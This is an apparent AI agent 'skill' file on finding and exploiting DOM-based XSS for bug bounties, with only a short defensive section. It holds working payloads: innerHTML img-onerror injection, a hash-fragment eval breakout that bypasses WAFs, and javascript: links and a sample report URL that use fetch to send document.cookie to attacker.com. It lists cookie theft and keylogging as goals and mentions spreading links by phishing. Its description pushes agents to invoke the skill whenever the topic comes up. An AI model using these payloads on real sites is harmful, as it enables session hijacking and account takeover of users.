---
name: dom-based-cross-site-scripting-xss
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit DOM-based Cross-Site Scripting (XSS) vulnerabilities where malicious
  payloads are executed entirely within the victim's browser via insecure JavaScript execution,
  often bypassing server-side WAFs completely.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: advanced
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0002]
  techniques: [T1189, T1059.007]
platforms: [linux, windows, macos]
tags: [xss, dom-xss, cross-site-scripting, javascript, bug-bounty, owasp-top-10]
tools: [burp-suite, chrome-devtools]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# DOM-Based Cross-Site Scripting (XSS)

## When to Use
- When auditing modern Single Page Applications (SPAs) built with React, Angular, or Vue that on client-side routing and rendering.
- When standard Reflected or Stored XSS payloads are caught by the server's Web Application Firewall (WAF), but the payload is processed in the URL fragment (`#`).
- To steal user session cookies, execute Cross-Site Request Forgery (CSRF) via XSS, or log keystrokes from a targeted user.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding Source and Sink

```javascript
// Concept: DOM XSS occurs when an application contains client-side JavaScript that 
// processes data from an untrusted "Source" in an unsafe way, usually by writing that 
// data to a dangerous "Sink".

// Sources (Where attacker controls input):
// location.search, location.hash, document.referrer, window.name

// Sinks (Where code executes):
// eval(), setTimeout(), document.write(), element.innerHTML, location.href
```

### Phase 2: Exploiting `location.search` to `innerHTML`

```html
<!-- Vulnerable application code: -->
<script>
    // Reads from the URL Search parameter (?query=...)
    let params = new URLSearchParams(window.location.search);
    let userQuery = params.get("query");
    
    // Writes directly to the DOM without escaping
    document.getElementById("search-results").innerHTML = "Results for: " + userQuery;
</script>

<!-- The Exploit: -->
<!-- Navigate to: https://target.com/search?query=<img src=x onerror=alert(document.domain)> -->
<!-- The browser parses the `<img>` tag inserted via innerHTML. The image fails to load, triggering the malicious onerror JavaScript. -->
```

### Phase 3: Exploiting `location.hash` (WAF Bypass)

```javascript
// Concept: Browsers DO NOT send the URL fragment (anything after the `#`) to the server.
// Therefore, server-side WAFs cannot detect payloads injected into the hash.

// Vulnerable application code:
window.onload = function() {
    // Reads directly from the fragment (e.g., #greetingMessage)
    var hash = window.location.hash.substring(1); 
    if(hash) {
        // DANGEROUS SINK: Evaluating a string as JavaScript code
        eval("console.log('" + hash + "');"); 
    }
}

// The Exploit:
// Navigate to: https://target.com/profile#');alert(document.cookie);//
//
// The eval function receives: eval("console.log('');alert(document.cookie);//');");
// The WAF never sees the `alert(document.cookie)` because it was in the `#`.
```

### Phase 4: Bypassing React / Modern Frameworks

```javascript
// Concept: React generally protects against XSS by encoding variables {likeThis}. 
// However, developers use `dangerouslySetInnerHTML` or process `javascript:` URIs incorrectly.

// Vulnerable React Component:
function UserProfile({ websiteUrl }) {
    // The attacker controls `websiteUrl`. React blocks <script> tags, but NOT malicious URLs.
    return (
        <a href={websiteUrl}>Click to visit my website</a>
    );
}

// The Exploit:
// The attacker sets their profile website URL in the database to:
// `javascript:fetch('https://attacker.com/?cookie='+document.cookie)`
// 
// When the victim clicks the link, the JavaScript executes within the context of the SPA.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Analyze Client-Side JS] --> B{Find a Source}
    B -->|location.search / .hash| C{Trace data flow to a Sink}
    C -->|`innerHTML` or `.html()`| D[Inject HTML tags e.g., `<img src=x onerror=...>`]
    C -->|`eval()`, `setTimeout()`| E[Inject JS syntax directly e.g., `"-alert(1)-"`]
    C -->|`location.href` or `<a>` href| F[Inject JS URI e.g., `javascript:alert(1)`]
    D --> G[Is it filtered?]
    G -->|Yes| H[Try encoding, uppercase, SVG tags, or DOM Clobbering]
    G -->|No| I[Execute XSS Payload]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Context-Aware Escaping**: Never insert untrusted data directly into high-risk Sinks like `innerHTML`. Use `textContent` or `innerText` instead, which treat the input strictly as text, rendering HTML tags harmlessly as strings.
- **Trusted Types API**: Enforce the Trusted Types Content Security Policy (CSP) header. This forces all JavaScript writing to DANGEROUS DOM sinks to pass the data through a defined sanitization function first, virtually eliminating DOM XSS by design.
- **Strict CSP**: Implement a strict Content Security Policy (`script-src 'self'`). Prevent the execution of inline scripts (`<script>...</script>`) and strictly prohibit `eval()` and `unsafe-inline`.

## Key Concepts
| Concept | Description |
|---------|-------------|
| DOM (Document Object Model) | The structural representation of the HTML page within the browser. JavaScript interacts with and modifies the DOM dynamically |
| Source | A JavaScript property that the attacker can control (e.g., `location.hash`, `document.referrer`) |
| Sink | A JavaScript function or DOM object that executes code or renders HTML when provided with data (e.g., `eval()`, `document.write()`) |
| DOM Clobbering | An advanced XSS technique where HTML elements with specific `id` or `name` attributes are injected to overwrite global JavaScript variables used by the application |

## Output Format
```
Bug Bounty Report: DOM XSS via `location.hash` to `eval()`
==========================================================
Vulnerability: DOM-Based Cross-Site Scripting (OWASP A03:2021)
Severity: High (CVSS 8.2)
Target: `https://app.company.com/dashboard`

Description:
A DOM-Based XSS vulnerability exists on the primary dashboard page concerning the client-side processing of the URL hash fragment. The application utilizes a legacy customization script that reads `window.location.hash` to determine a custom greeting theme.

The script passes this variable directly into an `eval()` statement on line 412 of `app-bundle.js` without any sanitization or type-checking. Because the payload exists entirely within the URL fragment (`#`), it is never transmitted to the backend server, entirely bypassing the Akamai WAF.

Reproduction Steps:
1. Ensure you have an active victim session on the target application.
2. Navigate to the following crafted URL containing the payload:
   `https://app.company.com/dashboard#");fetch('https://attacker.com/log?cookie='+btoa(document.cookie));//`
3. The JavaScript executes within the victim's browser context.
4. The victim's active session cookie is encoded and transmitted to the external attacker-controlled domain.

Impact:
Full account takeover for any user who clicks the malicious link. Due to WAF evasion, this link can be distributed widely via phishing campaigns without perimeter detection.
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (XSS)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Google (IDX)** | $22,500 | Aditya Sunny | XSS in IDX Workstation via `postMessage` origin bypass → RCE | 2025 |
| **Uber** | $10,000 | (Undisclosed) | DOM XSS via `eval()` in third-party `analytics.js` — URL parameter injection | 2025 |
| **Uber** | $7,000 | (Undisclosed) | XSS via improper regex in third-party JavaScript | 2023 |
| **Google** | $5,000 | Patrik Fehrenbach | Sleeping Stored XSS — payload executed days after injection | 2023 |
| **Shopify** | $5,300 | Ashketchum | Stored XSS in admin panel Rich Text Editor — product descriptions | 2025 |
| **Shopify** | $500 | (Undisclosed) | Reflected XSS on `help.shopify.com` via `returnTo` parameter | 2023 |
| **HackerOne** | (Disclosed) | frans | Marketo Forms XSS — postMessage frame-jumping + jQuery-JSONP | 2023 |

**Key Lesson**: The Google IDX bug shows why XSS escalation matters — a "simple" XSS became
$22,500 because the researcher chained it with `postMessage` origin flaws to achieve RCE.
Shopify's $5,300 Stored XSS in admin RTE proves stored contexts on internal pages pay 10x more.

**What the triager wants to see:**
```
Title: Stored XSS in /admin/products Rich Text Editor Allows Session Hijacking of All Staff
NOT: "XSS Found"
```

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- PortSwigger: [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- Google Developers: [Prevent DOM-based cross-site scripting vulnerabilities with Trusted Types](https://web.dev/trusted-types/)
